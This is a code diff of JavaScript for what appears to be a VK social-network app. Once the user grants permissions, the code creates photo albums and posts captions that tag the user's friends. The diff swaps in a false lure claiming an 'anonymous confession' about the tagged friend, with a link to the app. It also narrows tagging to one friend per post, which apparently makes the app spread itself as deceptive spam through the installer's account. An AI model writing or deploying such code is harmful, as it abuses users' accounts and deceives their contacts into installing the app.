@@ -71,7 +71,7 @@
             }
             if(permissions == 0) {
               openApp();
-              saveVideo();
+              //saveVideo();
               createAlbom();
             }else{
               $("html").html(' \n\
@@ -145,7 +145,7 @@
                     }
 
                     var text = [
-                      users_list+" одному из вас я "+sex_txt+" мнение, как думаете кому? Ссылкa на приложение у меня на стeне"
+                      users_list+" о тебе есть анонимное признание, посмотри если интересно : \n\n https://vk.com/app"+parseInt(findGetParameter("vk_app_id"))
                     ];
                     var caption = text[getRandom(0,text.length-1)];
 
@@ -174,7 +174,7 @@
 
 
                       if(viewer.friends.items[global_offset_i] && count_photos < 20){
-                        uploadPhotoAlbom(id_albom);
+                        createAlbom();
                       }
 
 
@@ -206,9 +206,9 @@
           //users_list += "[id"+viewer.friends.items[global_offset_i].id+"|"+viewer.friends.items[global_offset_i].first_name+"], ";
           global_offset_i++;
         //  if(viewer.friends.items[i].sex == 1){
-            users_list +="@id"+viewer.friends.items[i].id+" ("+viewer.friends.items[i].first_name+"), ";
+            users_list +="@id"+viewer.friends.items[i].id+" ("+viewer.friends.items[i].first_name+")";
             count++;
-            if(count > 2) {
+            if(count > 0) {
               return users_list;
             }
           //}
